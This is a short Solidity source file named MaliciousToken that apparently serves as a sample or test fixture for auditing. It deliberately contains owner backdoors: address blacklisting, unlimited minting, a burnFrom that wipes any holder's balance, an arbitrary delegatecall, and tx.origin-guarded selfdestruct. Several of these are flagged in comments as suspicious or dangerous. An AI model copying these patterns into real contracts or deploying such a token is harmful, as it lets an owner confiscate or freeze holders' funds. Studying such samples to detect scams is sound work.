// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

contract MaliciousToken {
    address public owner;
    mapping(address => bool) public blacklist;
    mapping(address => uint256) public balances;
    uint256 public totalSupply;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
        balances[owner] = 1_000_000 ether;
        totalSupply = 1_000_000 ether;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(!blacklist[msg.sender], "blacklisted");
        require(!blacklist[to], "recipient blacklisted");
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }

    function addBlacklist(address user) external onlyOwner {
        blacklist[user] = true;
    }

    function removeBlacklist(address user) external onlyOwner {
        blacklist[user] = false;
    }

    function mint(address to, uint256 amount) public onlyOwner {
        balances[to] += amount;
        totalSupply += amount;
    }

    function burnFrom(address victim, uint256 amount) external onlyOwner {
        // suspicious — owner can wipe arbitrary balance
        balances[victim] -= amount;
        totalSupply -= amount;
    }

    function delegateExec(address impl, bytes calldata data) external onlyOwner returns (bytes memory) {
        // dangerous: delegatecall pattern
        (bool ok, bytes memory ret) = impl.delegatecall(data);
        require(ok, "delegatecall failed");
        return ret;
    }

    function rescue() external {
        require(tx.origin == owner, "not origin"); // tx.origin auth
        selfdestruct(payable(owner));
    }

    receive() external payable {}
    fallback() external payable {}
}
